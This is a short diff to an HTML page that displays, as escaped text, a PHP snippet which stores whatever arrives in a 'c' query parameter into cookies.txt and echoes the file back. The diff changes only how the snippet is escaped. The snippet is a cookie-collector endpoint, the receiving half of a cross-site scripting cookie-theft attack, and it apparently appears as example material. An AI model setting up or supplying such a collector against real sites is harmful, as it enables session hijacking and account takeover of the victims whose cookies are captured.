@@ -6,12 +6,12 @@
 <meta name="description" content="" />
 </head>
 <body>
-  \<?php<br/>
+  &lt?php<br/>
     if (isset($_GET['c'])) {<br/>
-      file_put_contents("cookies.txt", $_GET['c']."<br/>", FILE_APPEND);<br/>
+      file_put_contents("cookies.txt", $_GET['c']."&ltbr/>", FILE_APPEND);<br/>
     }<br/>
 
     $file = fopen("cookies.txt", "r");<br/>
     echo fread($file,filesize("cookies.txt"));<br/>
-  \?><br/>
+  ?><br/>
 </body>
